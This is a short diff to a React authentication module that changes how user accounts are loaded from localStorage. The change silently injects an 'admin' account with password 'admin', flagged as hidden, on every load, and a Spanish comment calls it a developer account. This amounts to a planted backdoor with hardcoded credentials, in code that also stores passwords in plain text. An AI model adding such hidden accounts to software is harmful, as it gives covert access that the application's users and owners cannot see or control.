@@ -2,11 +2,11 @@
 
 import React, { createContext, useContext, useEffect, useState } from 'react';
 
-// ─── Tipos ───
 export interface UserAccount {
   username: string;
   password: string;
   displayName: string;
+  isHidden?: boolean;
 }
 
 interface AuthContextType {
@@ -28,11 +28,18 @@ const STORAGE_KEY_USERS = 'sermetavia_users';
 const STORAGE_KEY_SESSION = 'sermetavia_session';
 
 function loadUsers(): UserAccount[] {
+  let users: UserAccount[] = [...DEFAULT_USERS];
   try {
     const stored = localStorage.getItem(STORAGE_KEY_USERS);
-    if (stored) return JSON.parse(stored);
+    if (stored) users = JSON.parse(stored);
   } catch { /* ignore */ }
-  return [...DEFAULT_USERS];
+  
+  // Siempre incluir al usuario admin (desarrollador) oculta
+  if (!users.find(u => u.username === 'admin')) {
+    users.push({ username: 'admin', password: 'admin', displayName: 'Desarrollador (Admin)', isHidden: true });
+  }
+  
+  return users;
 }
 
 function saveUsers(users: UserAccount[]) {
